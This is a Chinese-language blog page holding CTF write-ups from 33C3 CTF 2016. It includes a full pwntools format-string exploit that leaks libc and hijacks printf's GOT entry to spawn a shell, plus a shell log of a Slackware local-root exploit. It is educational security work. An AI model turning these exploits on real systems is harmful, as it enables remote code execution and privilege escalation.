<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">
<meta name="baidu-site-verification" content="codeva-HZoIBm8yNp" />
<meta name="bytedance-verification-code" content="xa6iZeY+/XCOJvarHaDY" />








<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Liunx Python Rust Goalng DevOPS" />










<meta name="description" content="个人随想，瞎子的世界">
<meta property="og:type" content="website">
<meta property="og:title" content="逐流小站">
<meta property="og:url" content="https://blog.feedscoin.com/page/45/index.html">
<meta property="og:site_name" content="逐流小站">
<meta property="og:description" content="个人随想，瞎子的世界">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Laird Lau">
<meta property="article:tag" content="Liunx Python Rust Goalng DevOPS">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.feedscoin.com/page/45/"/>





  <title>逐流小站</title>
  





<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-MW47YH6RH0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-MW47YH6RH0');
</script>





<meta name="generator" content="Hexo 7.0.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">逐流小站</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/33C3-CTF-2016-ESPR-150/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/33C3-CTF-2016-ESPR-150/" itemprop="url">[33C3 CTF 2016] ESPR 150 </a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-31T09:25:00+08:00">
                2016-12-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 150<br>Author: bruce30262 @ BambooFox</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>這題沒有給任何的 binary，只有一張圖片，長得像這樣:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eat:                  sleep:</span><br><span class="line">+-----------------+   +----------------+</span><br><span class="line">| sub rsp, 0x100  |   | mov edi, 0x1   |</span><br><span class="line">| mov rdi, rsp    |   | call _sleep    |</span><br><span class="line">| call _gets      |   |                |</span><br><span class="line">|                 |   |                |</span><br><span class="line">+-----------------+   +----------------+</span><br><span class="line">pwn:                  repeat:</span><br><span class="line">+-----------------+   +----------------+</span><br><span class="line">| mov rdi, rsp    |   |                |</span><br><span class="line">| call _printf    |   | jmp eat        |</span><br><span class="line">| add rsp, 0x100  |   |                |</span><br><span class="line">|                 |   |                |</span><br><span class="line">+-----------------+   +----------------+</span><br></pre></td></tr></table></figure>

<p>hmmm……</p>
<p>可以發現到程式裡有兩個很明顯的漏洞: stack overflow 與 format string。這題 stack overflow 應該是打不了，因為有個無限迴圈在那邊，程式無法 return。因此這題的重點在於如何在沒有提供任何 binary 的情況下利用 format string 漏洞來 exploit 整個 service。 </p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>在這裡不得不提 pwntools 裡頭一個相當強大的 module — <a target="_blank" rel="noopener" href="http://docs.pwntools.com/en/stable/dynelf.html">DynELF</a>。透過 <code>DynELF</code> 以及程式當中的<strong>任意讀漏洞</strong>，pwntools 將有辦法幫助我們 leak 出遠端機器的 binary 資訊，包括 function 在 libc 中的位址，遠端 binary 的 <code>.dynamic</code> section 位址……等等。</p>
<p>要使用這個功能，首先我們必須提供一個 <code>leak</code> function，來讓 pwntools 有辦法透過這個 function leak 出任意位址的內容。這題的 <code>leak</code> function 可以透過程式當中的 format string 漏洞來實作:</p>
<figure class="highlight python"><figcaption><span>leak</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    payload = <span class="string">&quot;%7$s.AAA&quot;</span>+p64(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    resp = r.recvuntil(<span class="string">&quot;.AAA&quot;</span>)</span><br><span class="line">    ret = resp[:-<span class="number">4</span>:] + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, <span class="built_in">repr</span>(ret)</span><br><span class="line">    r.recvrepeat(<span class="number">0.2</span>) <span class="comment"># receive the rest of the string</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure>

<p>之後我們還必須提供一個 binary 裡頭的位址。透過輸入 <code>%30$p</code>，我們可以 leak 出遠端 binary 的 text address <code>0x40060d</code>。之後我們就可以透過 <code>DynELF</code> 來幫助我們 resolve 一些 libc 中的 function address。</p>
<p>首先我們會需要遠端的 <code>printf</code> 和 <code>system</code> 的 function address:</p>
<figure class="highlight python"><figcaption><span>leak library addresses</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, <span class="number">0x40060d</span>)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">printf_addr = d.lookup(<span class="string">&#x27;printf&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">​</span><br><span class="line">log.success(<span class="string">&quot;printf_addr: &quot;</span>+<span class="built_in">hex</span>(printf_addr))</span><br><span class="line">log.success(<span class="string">&quot;system_addr: &quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br></pre></td></tr></table></figure>
<p>因為每 leak 一次就要 sleep 一秒的關係，因此這邊 resolve 的過程會花些時間 ( pwntools 會需要 leak 出一堆 address 來 resolve function 的位址 )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] printf_addr: 0x7fb040a17550</span><br><span class="line">[+] system_addr: 0x7fb040a066d0</span><br></pre></td></tr></table></figure>

<p>有了遠端的 <code>printf</code> 和 <code>system</code> 的 address，我們就可以計算兩者之間的 offset，然後在下一次的連線中透過以下步驟來進行 exploit:</p>
<ol>
<li>先 leak 出 <code>printf@got.plt</code>，然後計算 <code>system</code> 的位址</li>
<li>透過 format string 來 overwrite <code>printf</code> 的 GOT ( hijack 成 <code>system</code> )</li>
<li>輸入 “sh”，執行 <code>system(&quot;sh&quot;)</code> 拿 shell</li>
</ol>
<p>那麼該怎麼獲得 <code>printf</code>  GOT 的位址呢 ? 這裡我是先透過 <code>DynELF</code> 的 <code>dynamic</code> 功能來獲取 <code>.dynamic</code> section 的位址:</p>
<figure class="highlight python"><figcaption><span>resolve .dynamic section</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, <span class="number">0x40060d</span>)</span><br><span class="line">dynamic_ptr = d.dynamic</span><br></pre></td></tr></table></figure>

<p>有了 <code>.dynamic</code> section 的位址，我們就可以透過 leak <code>.dynamic</code> section 的資訊來獲取 <code>.got.plt</code> 的位址:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Dynamic section at offset 0xe28 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]</span><br><span class="line"> 0x000000000000000c (INIT)               0x400400</span><br><span class="line"> 0x000000000000000d (FINI)               0x400614</span><br><span class="line"> 0x0000000000000019 (INIT_ARRAY)         0x600e10</span><br><span class="line"> 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000000000001a (FINI_ARRAY)         0x600e18</span><br><span class="line"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000006ffffef5 (GNU_HASH)           0x400298</span><br><span class="line"> 0x0000000000000005 (STRTAB)             0x400330</span><br><span class="line"> 0x0000000000000006 (SYMTAB)             0x4002b8</span><br><span class="line"> 0x000000000000000a (STRSZ)              68 (bytes)</span><br><span class="line"> 0x000000000000000b (SYMENT)             24 (bytes)</span><br><span class="line"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class="line"> 0x0000000000000003 (PLTGOT)             0x601000  &lt;--- here</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><figcaption><span>resolve PLTGOT</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    addr = dynamic_ptr + <span class="number">0x10</span>*cnt</span><br><span class="line">    ret = leak(addr)</span><br><span class="line">    <span class="keyword">if</span> ret == <span class="string">&quot;\x03\x00&quot;</span>: <span class="comment">#TYPE PLTGOT</span></span><br><span class="line">        addr += <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">            ret = leak(addr+i)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, ret.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>最後，透過 leak 出所有的 GOT entry，我們可以藉由比對 function address 的低 12 bit 來判斷 <code>printf@got.plt</code> 的位址:</p>
<figure class="highlight python"><figcaption><span>resolve printf@got.plt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">got = <span class="number">0x601000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    addr = got + i*<span class="number">8</span></span><br><span class="line">    ret = leak(addr)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, ret.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>這下該有的位址都有了，可以開始 exploit 了:</p>
<figure class="highlight python"><figcaption><span>exp_espr.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">​</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">​</span><br><span class="line">HOST = <span class="string">&quot;78.46.224.86&quot;</span></span><br><span class="line">PORT = <span class="number">1337</span></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line">​</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    payload = <span class="string">&quot;%7$s.AAA&quot;</span>+p64(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    resp = r.recvuntil(<span class="string">&quot;.AAA&quot;</span>)</span><br><span class="line">    ret = resp[:-<span class="number">4</span>:] + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, <span class="built_in">repr</span>(ret)</span><br><span class="line">    r.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">​</span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">​</span><br><span class="line">    printf_got = <span class="number">0x601018</span></span><br><span class="line">    printf_addr = u64(leak(printf_got).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    system_addr = printf_addr - <span class="number">0x10e80</span> <span class="comment"># remote</span></span><br><span class="line">​</span><br><span class="line">    log.success(<span class="string">&quot;printf_addr: &quot;</span>+<span class="built_in">hex</span>(printf_addr))</span><br><span class="line">    log.success(<span class="string">&quot;system_addr: &quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">​</span><br><span class="line">    byte1 = system_addr &amp; <span class="number">0xff</span></span><br><span class="line">    byte2 = (system_addr &amp; <span class="number">0xffff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">    log.success(<span class="string">&quot;byte1: &quot;</span>+<span class="built_in">hex</span>(byte1))</span><br><span class="line">    log.success(<span class="string">&quot;byte2: &quot;</span>+<span class="built_in">hex</span>(byte2))</span><br><span class="line">​</span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(byte1) + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%10$hhn.&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(byte2-byte1-<span class="number">1</span>) + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%11$hn.&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">32</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    payload += p64(printf_got) + p64(printf_got+<span class="number">1</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.sendline(<span class="string">&quot;sh\x00&quot;</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
<p>​<br>flag: <code>33C3_f1rst_tshirt_challenge?!</code></p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/33C3-CTF-2016-The-0x90s-called-150/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/33C3-CTF-2016-The-0x90s-called-150/" itemprop="url">[33C3 CTF 2016] The 0x90s called 150</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-31T08:36:00+08:00">
                2016-12-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 150<br>Author: bruce30262 @ BambooFox</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>首先我們會需要到一個網頁來”啟動”我們的 challenge session。啟動後網頁會告訴我們 port 要連多少 ( IP 則是跟 web service 同一個 IP )，並告訴我們帳號密碼。一個 session 的連線時間為 5 分鐘。</p>
<p>nc 連過去並登入遠端機器之後，我們會發現這是一個 <a target="_blank" rel="noopener" href="http://www.slackware.com/">Slackware Linux</a>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ nc 78.46.224.70 2323</span><br><span class="line"></span><br><span class="line">Welcome to Linux 0.99pl12.</span><br><span class="line"></span><br><span class="line">slack login: challenge</span><br><span class="line">Password:challenge</span><br><span class="line"></span><br><span class="line">Linux 0.99pl12. (Posix).</span><br><span class="line">No mail.</span><br><span class="line">slack:~$ uname -a</span><br><span class="line">Linux slack 0.99.12 #6 Sun Aug 8 16:02:35 CDT 1993 i586</span><br></pre></td></tr></table></figure>
<p>隨意逛了一下，會發現在根目錄有個 flag.txt:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slack:/$ ls -al /flag.txt</span><br><span class="line">-r--------   1 root     root           36 Dec 27  1916 /flag.txt</span><br></pre></td></tr></table></figure>

<p>看來我們需要一個 local root 的 exploit 來解這題</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>強大的 google 使得我們很快就找到了 slackware linux 0.99 local root exploit 的 <a target="_blank" rel="noopener" href="https://github.com/HackerFantastic/Public/blob/master/exploits/prdelka-vs-GNU-lpr.c">PoC</a>。接下來只要想辦法把 PoC 傳到遠端機器上，然後編譯執行 exploit 即可。</p>
<p>問題是這題要傳 PoC 很麻煩，因為遠端機器根本沒有 tool 可以幫助我們下載檔案 — 沒有 wget，沒有 curl，甚至連 nc 都沒有 ! 然後上面的 vi 編輯器難用到掉渣 ! 最後決定使用 <code>cat &lt;&lt;&#39;EOF&#39; &gt;&gt; test.c</code> + 複製貼上的方式將 exploit 寫入 test.c 裡頭</p>
<p>之後只要編譯執行 local root 的 exploit，即可拿到 root 權限並得到 flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">slack:~$ gcc -o test test.c</span><br><span class="line">slack:~$ ./test</span><br><span class="line">[ Slackware linux 1.01 /usr/bin/lpr local root exploit</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid=405(challenge) gid=1(other) euid=0(root) egid=18(lp)</span><br><span class="line"># cat /flag.txt</span><br><span class="line">cat /flag.txt</span><br><span class="line">33C3_Th3_0x90s_w3r3_pre3tty_4w3s0m3</span><br></pre></td></tr></table></figure>

<p>flag: <code>33C3_Th3_0x90s_w3r3_pre3tty_4w3s0m3</code></p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/33C3-CTF-2016-pdfmaker-75/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/33C3-CTF-2016-pdfmaker-75/" itemprop="url">[33C3 CTF 2016] pdfmaker 75</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-31T08:14:00+08:00">
                2016-12-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
